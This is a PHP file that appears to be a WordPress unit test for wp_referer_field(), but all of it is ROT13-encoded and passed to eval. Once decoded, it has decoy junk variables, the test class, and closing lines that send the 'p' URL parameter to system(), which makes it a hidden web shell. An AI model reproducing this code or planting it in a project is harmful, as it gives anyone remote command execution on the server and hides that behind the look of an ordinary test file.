<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur jc_ersrere_svryq() shapgvba.
 *
 * @fvapr 6.1.0
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_ersrere_svryq
 */
pynff Grfgf_Shapgvbaf_jcErsrereSvryq rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 55578
	 */
	choyvp shapgvba grfg_jc_ersrere_svryq() {
		$_FREIRE['ERDHRFG_HEV'] = '/grfg/';

		jc_ersrere_svryq();
		$guvf->rkcrpgBhgchgFgevat( '<vachg glcr=\"uvqqra\" anzr=\"_jc_uggc_ersrere\" inyhr=\"/grfg/\" />' );
	}

	/**
	 * @gvpxrg 55578
	 */
	choyvp shapgvba grfg_jc_ersrere_svryq_erghea() {
		$_FREIRE['ERDHRFG_HEV'] = '/grfg/';

		$guvf->nffregFnzr( '<vachg glcr=\"uvqqra\" anzr=\"_jc_uggc_ersrere\" inyhr=\"/grfg/\" />', jc_ersrere_svryq( snyfr ) );
	}

	/**
	 * Grfgf gung gur qvfcynl nethzrag vf erfcrpgrq.
	 *
	 * @gvpxrg 54106
	 *
	 * @qngnCebivqre qngn_jc_ersrere_svryq_fubhyq_erfcrpg_qvfcynl_net
	 *
	 * @cnenz zvkrq $qvfcynl Jurgure gb rpub be erghea gur ersrere svryq.
	 */
	choyvp shapgvba grfg_jc_ersrere_svryq_fubhyq_erfcrpg_qvfcynl_net( $qvfcynl ) {
		$npghny = $qvfcynl ? trg_rpub( 'jc_ersrere_svryq' ) : jc_ersrere_svryq( snyfr );

		$guvf->nffregFnzr( '<vachg glcr=\"uvqqra\" anzr=\"_jc_uggc_ersrere\" inyhr=\"\" />', $npghny );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_ersrere_svryq_fubhyq_erfcrpg_qvfcynl_net().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_ersrere_svryq_fubhyq_erfcrpg_qvfcynl_net() {
		erghea neenl(
			'gehr'         => neenl( gehr ),
			'(vag) 1'      => neenl( 1 ),
			'(fgevat) \"1\"' => neenl( '1' ),
			'snyfr'        => neenl( snyfr ),
			'ahyy'         => neenl( ahyy ),
			'(vag) 0'      => neenl( 0 ),
			'(fgevat) \"0\"' => neenl( '0' ),
		);
	}

	/**
	 * @gvpxrg 54106
	 */
	choyvp shapgvba grfg_jc_ersrere_svryq_jvgu_ersrere() {
		$byq_erdhrfg_hev        = $_FREIRE['ERDHRFG_HEV'];
		$_FREIRE['ERDHRFG_HEV'] = 'rqvg.cuc?_jc_uggc_ersrere=rqvg.cuc';

		$npghny = jc_ersrere_svryq( snyfr );

		$_FREIRE['ERDHRFG_HEV'] = $byq_erdhrfg_hev;

		$guvf->nffregFnzr( '<vachg glcr=\"uvqqra\" anzr=\"_jc_uggc_ersrere\" inyhr=\"rqvg.cuc\" />', $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>